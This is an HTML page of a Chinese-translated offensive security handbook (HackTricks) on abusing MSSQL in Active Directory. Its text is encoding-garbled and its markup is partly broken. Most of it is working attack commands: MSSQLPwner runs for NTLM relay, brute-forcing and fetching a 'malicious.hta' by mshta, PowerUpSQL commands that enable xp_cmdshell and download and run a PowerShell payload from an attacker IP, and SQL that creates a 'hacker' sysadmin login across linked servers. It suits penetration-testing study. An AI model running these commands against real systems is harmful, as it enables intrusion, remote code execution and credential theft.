<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>MSSQL AD Abuse</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="mssql-ad-æ»¥ç”¨"><a class="header" href="#mssql-ad-æ»¥ç”¨">MSSQL AD æ»¥ç”¨</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="mssql-æšä¸¾--å‘ç°"><a class="header" href="#mssql-æšä¸¾--å‘ç°"><strong>MSSQL æšä¸¾ / å‘ç°</strong></a></h2>
<h3 id="python"><a class="header" href="#python">Python</a></h3>
<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a> å·¥å…·åŸºäº impacketï¼Œå…è®¸ä½¿ç”¨ kerberos ç¥¨è¯è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶é€šè¿‡é“¾æ¥é“¾è¿›è¡Œæ”»å‡»ã€‚</p>
<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
<h1 id="interactive-mode-with-2-depth-level-of-impersonations"><a class="header" href="#interactive-mode-with-2-depth-level-of-impersonations">Interactive mode with 2 depth level of impersonations</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive</p>
<h1 id="executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command"><a class="header" href="#executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command">Executing custom assembly on the current server with windows authentication and executing hostname command</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname</p>
<h1 id="executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command-on-the-srv01-linked-server"><a class="header" href="#executing-custom-assembly-on-the-current-server-with-windows-authentication-and-executing-hostname-command-on-the-srv01-linked-server">Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname</p>
<h1 id="executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server"><a class="header" href="#executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server">Executing the hostname command using stored procedures on the linked SRV01 server</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname</p>
<h1 id="executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server-with-sp_oacreate-method"><a class="header" href="#executing-the-hostname-command-using-stored-procedures-on-the-linked-srv01-server-with-sp_oacreate-method">Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate</p>
<h1 id="issuing-ntlm-relay-attack-on-the-srv01-server"><a class="header" href="#issuing-ntlm-relay-attack-on-the-srv01-server">Issuing NTLM relay attack on the SRV01 server</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250</p>
<h1 id="issuing-ntlm-relay-attack-on-chain-id-2e9a3696-d8c2-4edd-9bcc-2908414eeb25"><a class="header" href="#issuing-ntlm-relay-attack-on-chain-id-2e9a3696-d8c2-4edd-9bcc-2908414eeb25">Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250</p>
<h1 id="issuing-ntlm-relay-attack-on-the-local-server-with-custom-command"><a class="header" href="#issuing-ntlm-relay-attack-on-the-local-server-with-custom-command">Issuing NTLM relay attack on the local server with custom command</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250</p>
<h1 id="executing-direct-query"><a class="header" href="#executing-direct-query">Executing direct query</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"</p>
<h1 id="retrieving-password-from-the-linked-server-dc01"><a class="header" href="#retrieving-password-from-the-linked-server-dc01">Retrieving password from the linked server DC01</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password</p>
<h1 id="execute-code-using-custom-assembly-on-the-linked-server-dc01"><a class="header" href="#execute-code-using-custom-assembly-on-the-linked-server-dc01">Execute code using custom assembly on the linked server DC01</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll</p>
<h1 id="bruteforce-using-tickets-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-tickets-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt">Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt</p>
<h1 id="bruteforce-using-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-hashes-and-passwords-against-the-hosts-listed-on-the-hoststxt">Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt</p>
<h1 id="bruteforce-using-tickets-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-tickets-against-the-hosts-listed-on-the-hoststxt">Bruteforce using tickets against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt</p>
<h1 id="bruteforce-using-passwords-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-passwords-against-the-hosts-listed-on-the-hoststxt">Bruteforce using passwords against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt</p>
<h1 id="bruteforce-using-hashes-against-the-hosts-listed-on-the-hoststxt"><a class="header" href="#bruteforce-using-hashes-against-the-hosts-listed-on-the-hoststxt">Bruteforce using hashes against the hosts listed on the hosts.txt</a></h1>
<p>mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt</p>
<pre><code>### åœ¨æ²¡æœ‰åŸŸä¼šè¯çš„æƒ…å†µä¸‹ä»ç½‘ç»œæšä¸¾
</code></pre>
<h1 id="interactive-mode"><a class="header" href="#interactive-mode">Interactive mode</a></h1>
<p>mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive</p>
<pre><code>---
###  Powershell

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œpowershell æ¨¡å— [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) éå¸¸æœ‰ç”¨ã€‚
```powershell
Import-Module .\PowerupSQL.psd1
</code></pre>
<h3 id="åœ¨æ²¡æœ‰åŸŸä¼šè¯çš„æƒ…å†µä¸‹ä»ç½‘ç»œæšä¸¾"><a class="header" href="#åœ¨æ²¡æœ‰åŸŸä¼šè¯çš„æƒ…å†µä¸‹ä»ç½‘ç»œæšä¸¾">åœ¨æ²¡æœ‰åŸŸä¼šè¯çš„æƒ…å†µä¸‹ä»ç½‘ç»œæšä¸¾</a></h3>
<pre><code class="language-powershell"># Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP â€“Verbose â€“Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
</code></pre>
<h3 id="ä»åŸŸå†…éƒ¨æšä¸¾"><a class="header" href="#ä»åŸŸå†…éƒ¨æšä¸¾">ä»åŸŸå†…éƒ¨æšä¸¾</a></h3>
<pre><code class="language-powershell"># Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
</code></pre>
<h2 id="mssql-åŸºæœ¬æ»¥ç”¨"><a class="header" href="#mssql-åŸºæœ¬æ»¥ç”¨">MSSQL åŸºæœ¬æ»¥ç”¨</a></h2>
<h3 id="è®¿é—®æ•°æ®åº“"><a class="header" href="#è®¿é—®æ•°æ®åº“">è®¿é—®æ•°æ®åº“</a></h3>
<pre><code class="language-powershell">#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
</code></pre>
<h3 id="mssql-rce"><a class="header" href="#mssql-rce">MSSQL RCE</a></h3>
<p>åœ¨ MSSQL ä¸»æœºå†…éƒ¨<strong>æ‰§è¡Œå‘½ä»¤</strong>ä¹Ÿå¯èƒ½æ˜¯å¯è¡Œçš„ã€‚</p>
<pre><code class="language-powershell">Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
</code></pre>
<p>æ£€æŸ¥<strong>ä»¥ä¸‹éƒ¨åˆ†</strong>ä¸­æåˆ°çš„é¡µé¢ä»¥äº†è§£å¦‚ä½•æ‰‹åŠ¨æ‰§è¡Œæ­¤æ“ä½œã€‚</p>
<h3 id="mssql-åŸºæœ¬é»‘å®¢æŠ€å·§"><a class="header" href="#mssql-åŸºæœ¬é»‘å®¢æŠ€å·§">MSSQL åŸºæœ¬é»‘å®¢æŠ€å·§</a></h3>
<p>{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
<a href="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/">pentesting-mssql-microsoft-sql-server</a>
{% endcontent-ref %}</p>
<h2 id="mssql-å—ä¿¡ä»»é“¾æ¥"><a class="header" href="#mssql-å—ä¿¡ä»»é“¾æ¥">MSSQL å—ä¿¡ä»»é“¾æ¥</a></h2>
<p>å¦‚æœä¸€ä¸ª MSSQL å®ä¾‹è¢«å¦ä¸€ä¸ª MSSQL å®ä¾‹ä¿¡ä»»ï¼ˆæ•°æ®åº“é“¾æ¥ï¼‰ã€‚å¦‚æœç”¨æˆ·å¯¹å—ä¿¡ä»»çš„æ•°æ®åº“æ‹¥æœ‰æƒé™ï¼Œä»–å°†èƒ½å¤Ÿ<strong>åˆ©ç”¨ä¿¡ä»»å…³ç³»åœ¨å¦ä¸€ä¸ªå®ä¾‹ä¸­æ‰§è¡ŒæŸ¥è¯¢</strong>ã€‚è¿™äº›ä¿¡ä»»å¯ä»¥é“¾å¼è¿æ¥ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯èƒ½èƒ½å¤Ÿæ‰¾åˆ°ä¸€äº›é…ç½®é”™è¯¯çš„æ•°æ®åº“ï¼Œåœ¨é‚£é‡Œä»–å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><strong>æ•°æ®åº“ä¹‹é—´çš„é“¾æ¥ç”šè‡³å¯ä»¥è·¨æ£®æ—ä¿¡ä»»å·¥ä½œã€‚</strong></p>
<h3 id="powershell-æ»¥ç”¨"><a class="header" href="#powershell-æ»¥ç”¨">Powershell æ»¥ç”¨</a></h3>
<pre><code class="language-powershell">#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd &gt; 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "&lt;INSTANCE1&gt;" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "&lt;INSTANCE2&gt;"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv â€“Verbose â€“Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
</code></pre>
<h3 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ metasploit è½»æ¾æ£€æŸ¥å—ä¿¡ä»»çš„é“¾æ¥ã€‚</p>
<pre><code class="language-bash">#Set username, password, windows auth (if using AD), IP...
msf&gt; use exploit/windows/mssql/mssql_linkcrawler
[msf&gt; set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
</code></pre>
<p>æ³¨æ„ï¼Œmetasploit åªä¼šå°è¯•åœ¨ MSSQL ä¸­æ»¥ç”¨ <code>openquery()</code> å‡½æ•°ï¼ˆå› æ­¤ï¼Œå¦‚æœæ‚¨æ— æ³•ä½¿ç”¨ <code>openquery()</code> æ‰§è¡Œå‘½ä»¤ï¼Œæ‚¨å°†éœ€è¦å°è¯• <strong>æ‰‹åŠ¨</strong> ä½¿ç”¨ <code>EXECUTE</code> æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæ›´å¤šä¿¡æ¯è§ä¸‹æ–‡ã€‚ï¼‰</p>
<h3 id="æ‰‹åŠ¨---openquery"><a class="header" href="#æ‰‹åŠ¨---openquery">æ‰‹åŠ¨ - Openquery()</a></h3>
<p>ä» <strong>Linux</strong> æ‚¨å¯ä»¥ä½¿ç”¨ <strong>sqsh</strong> å’Œ <strong>mssqlclient.py</strong> è·å– MSSQL æ§åˆ¶å° shellã€‚</p>
<p>ä» <strong>Windows</strong> æ‚¨ä¹Ÿå¯ä»¥æ‰¾åˆ°é“¾æ¥å¹¶ä½¿ç”¨ <strong>MSSQL å®¢æˆ·ç«¯å¦‚</strong> <a href="https://www.heidisql.com"><strong>HeidiSQL</strong></a> æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><em>ä½¿ç”¨ Windows èº«ä»½éªŒè¯ç™»å½•ï¼š</em></p>
<p><img src="../../.gitbook/assets/image%20(808).png" alt="" /></p>
<h4 id="æŸ¥æ‰¾å¯ä¿¡é“¾æ¥"><a class="header" href="#æŸ¥æ‰¾å¯ä¿¡é“¾æ¥">æŸ¥æ‰¾å¯ä¿¡é“¾æ¥</a></h4>
<pre><code class="language-sql">select * from master..sysservers;
EXEC sp_linkedservers;
</code></pre>
<p><img src="../../.gitbook/assets/image%20(716).png" alt="" /></p>
<h4 id="åœ¨å¯ä¿¡é“¾æ¥ä¸­æ‰§è¡ŒæŸ¥è¯¢"><a class="header" href="#åœ¨å¯ä¿¡é“¾æ¥ä¸­æ‰§è¡ŒæŸ¥è¯¢">åœ¨å¯ä¿¡é“¾æ¥ä¸­æ‰§è¡ŒæŸ¥è¯¢</a></h4>
<p>é€šè¿‡é“¾æ¥æ‰§è¡ŒæŸ¥è¯¢ï¼ˆç¤ºä¾‹ï¼šåœ¨æ–°çš„å¯è®¿é—®å®ä¾‹ä¸­æŸ¥æ‰¾æ›´å¤šé“¾æ¥ï¼‰ï¼š</p>
<pre><code class="language-sql">select * from openquery("dcorp-sql1", 'select * from master..sysservers')
</code></pre>
<p>{% hint style="warning" %}
æ£€æŸ¥åŒå¼•å·å’Œå•å¼•å·çš„ä½¿ç”¨ï¼Œæ­£ç¡®ä½¿ç”¨å®ƒä»¬éå¸¸é‡è¦ã€‚
{% endhint %}</p>
<p><img src="../../.gitbook/assets/image%20(643).png" alt="" /></p>
<p>æ‚¨å¯ä»¥æ‰‹åŠ¨æ— é™åˆ¶åœ°ç»§ç»­è¿™äº›å—ä¿¡ä»»é“¾æ¥çš„é“¾ã€‚</p>
<pre><code class="language-sql"># First level RCE
SELECT * FROM OPENQUERY("&lt;computer&gt;", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("&lt;computer1&gt;", 'select * from openquery("&lt;computer2&gt;", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
</code></pre>
<p>å¦‚æœæ‚¨æ— æ³•é€šè¿‡ <code>openquery()</code> æ‰§è¡Œåƒ <code>exec xp_cmdshell</code> è¿™æ ·çš„æ“ä½œï¼Œè¯·å°è¯•ä½¿ç”¨ <code>EXECUTE</code> æ–¹æ³•ã€‚</p>
<h3 id="æ‰‹åŠ¨---execute"><a class="header" href="#æ‰‹åŠ¨---execute">æ‰‹åŠ¨ - EXECUTE</a></h3>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <code>EXECUTE</code> æ»¥ç”¨å—ä¿¡ä»»çš„é“¾æ¥ï¼š</p>
<pre><code class="language-bash">#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
</code></pre>
<h2 id="æœ¬åœ°æƒé™æå‡"><a class="header" href="#æœ¬åœ°æƒé™æå‡">æœ¬åœ°æƒé™æå‡</a></h2>
<p><strong>MSSQL æœ¬åœ°ç”¨æˆ·</strong> é€šå¸¸å…·æœ‰ä¸€ç§ç‰¹æ®Šç±»å‹çš„æƒé™ï¼Œç§°ä¸º <strong><code>SeImpersonatePrivilege</code></strong>ã€‚è¿™å…è®¸è¯¥è´¦æˆ·åœ¨èº«ä»½éªŒè¯åâ€œæ¨¡æ‹Ÿå®¢æˆ·ç«¯â€ã€‚</p>
<p>è®¸å¤šä½œè€…æå‡ºçš„ä¸€ç§ç­–ç•¥æ˜¯å¼ºåˆ¶ SYSTEM æœåŠ¡å‘æ”»å‡»è€…åˆ›å»ºçš„æ¶æ„æˆ–ä¸­é—´äººæœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯ã€‚è¿™ä¸ªæ¶æ„æœåŠ¡èƒ½å¤Ÿåœ¨ SYSTEM æœåŠ¡å°è¯•è¿›è¡Œèº«ä»½éªŒè¯æ—¶æ¨¡æ‹Ÿè¯¥æœåŠ¡ã€‚</p>
<p><a href="https://github.com/CCob/SweetPotato">SweetPotato</a> æ”¶é›†äº†è¿™äº›å¯ä»¥é€šè¿‡ Beacon çš„ <code>execute-assembly</code> å‘½ä»¤æ‰§è¡Œçš„å„ç§æŠ€æœ¯ã€‚</p>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
